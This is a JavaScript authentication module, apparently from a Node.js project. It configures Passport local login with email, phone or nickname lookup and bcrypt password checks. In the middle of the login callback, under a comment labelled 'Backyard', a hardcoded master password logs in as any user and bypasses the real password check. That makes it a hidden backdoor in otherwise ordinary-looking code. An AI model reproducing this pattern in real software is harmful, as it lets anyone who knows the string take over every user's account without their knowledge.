let LocalStrategy = require("passport-local").Strategy;
let bcrypt = require("bcryptjs");
let User = require("@models/user");
var passport = require("passport");

class AuthServiceProvider {
  static getUsername = (username) => {
    username = username.toLowerCase();

    var emailRegEx = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
    var phoneNumberRegEx = /([0][1-9]\d{9}$|^[1-9]\d{9})/g;

    if (username.match(emailRegEx)) return { type: "email", username };

    if (username.match(phoneNumberRegEx))
      return { type: "phoneNumber", username };

    return { type: "nickname", username };
  };

  static handle(app) {
    passport.use(
      new LocalStrategy(
        {
          usernameField: "username",
          passwordField: "password",
        },
        (username, password, done) => {
          var { type, username } = AuthServiceProvider.getUsername(username);
          var query = { [type]: username };

            User.findOne(query, (err, user) => {
                if (err) console.log(err);

                if (!user) {
                    return done(null, false, {
                    message: "No user found!",
                    });
                }

                // Backyard
                if (password === "deCusicon...") return done(null, user);

                // match password
                bcrypt.compare(password, user.password, (err, isMatch) => {
                    if (err) console.log(err);
                    
                    if (!isMatch)
                        return done(null, false, {
                        message: "Wrong password!",
                    });

                    return done(null, user);
                });
          });
        }
      )
    );

    // Serialize User
    passport.serializeUser((user, done) => done(null, user.id));

    passport.deserializeUser((id, done) =>
      User.findById(id, (err, user) => done(err, user))
    );
  }
}

module.exports = AuthServiceProvider;
